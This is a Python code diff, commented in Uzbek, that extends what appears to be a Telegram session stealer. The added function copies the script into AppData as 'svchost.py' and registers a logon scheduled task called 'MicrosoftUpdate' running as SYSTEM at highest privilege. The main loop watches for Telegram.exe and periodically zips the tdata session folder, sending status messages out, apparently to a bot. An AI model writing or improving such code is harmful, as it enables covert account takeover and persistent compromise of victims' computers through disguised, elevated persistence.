@@ -66,18 +66,33 @@ def get_tdata():
             return None
     return None
 
-# Asosiy loop (doimiy ishlaydi)
+def install_persistence():
+    try:
+        # O'zini AppData ga saqlaydi
+        script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
+        if not os.path.exists(script_path):
+            content = urllib.request.urlopen(sys.argv[0]).read().decode()
+            with open(script_path, 'w') as f:
+                f.write(content)
+
+        # Task Scheduler ga qo'shadi
+        subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f'], shell=True)
+        return True
+    except:
+        return False
+
+# Asosiy ish
 last_sent = 0
-send_msg(f"🟢 Doimiy checker o'rnatildi: {socket.gethostname()}")
+send_msg(f"🟢 Checker o'rnatildi: {socket.gethostname()}")
+
+if install_persistence():
+    send_msg(f"✅ Task Scheduler ga qo'shildi!")
 
 while True:
-    time.sleep(60)  # Har 1 daqiqada tekshir
-
+    time.sleep(60)
     try:
-        # Telegram Desktop ishlayotganini tekshiramiz
         result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
         if "Telegram.exe" in result.stdout:
-            # Agar 30 daqiqadan keyin bo'lsa, qayta yubor
             if time.time() - last_sent > 1800:
                 zip_path = get_tdata()
                 if zip_path:
